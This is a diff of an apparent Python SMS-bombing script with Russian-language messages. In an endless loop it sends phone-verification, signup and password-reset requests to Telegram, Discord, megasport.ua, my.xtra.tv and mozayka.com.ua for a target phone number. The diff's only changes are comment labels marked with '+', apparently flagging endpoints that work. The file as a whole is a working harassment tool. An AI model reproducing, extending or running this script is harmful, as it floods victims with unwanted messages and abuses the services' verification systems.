@@ -13,13 +13,13 @@ while True:
      response = requests.post('https://mozayka.com.ua/!processing/ajax.php', headers=headers, json={'phone': "+" + NUMBER})
  except:
      print("Не доставлено")
-#Телеграм
+#Телеграм+
  try:
      print('Отправлено')
      response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': "+" + NUMBER})
  except:
      print('Не доставлено')
-#Дискорд
+#Дискорд+
  try:
      print('Отправлено')
      response = requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, data={'phone': "+" + NUMBER})
@@ -31,19 +31,19 @@ while True:
      response = requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, json={'phone': "+" + NUMBER})
  except:
      print('Не доставлено')
-#megasport.ua
+#megasport.ua+
  try:
      print('Отправлено')
      response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers=headers, json={'phone': "+" + NUMBER})
  except:
      print('Не доставлено')
-#my.xtra.tv
+#my.xtra.tv+
  try:
      print('Отправлено')
      response = requests.post('https://my.xtra.tv/api/signup?lang=uk', headers=headers, data={'phone': "+" + NUMBER})
  except:
      print('Не доставлено')
-#my.xtra.tv/password
+#my.xtra.tv/password+
  try:
      print('Отправлено')
      response = requests.post('https://my.xtra.tv/api/password/restore?lang=uk', headers=headers, data={'phone': "+" + NUMBER})
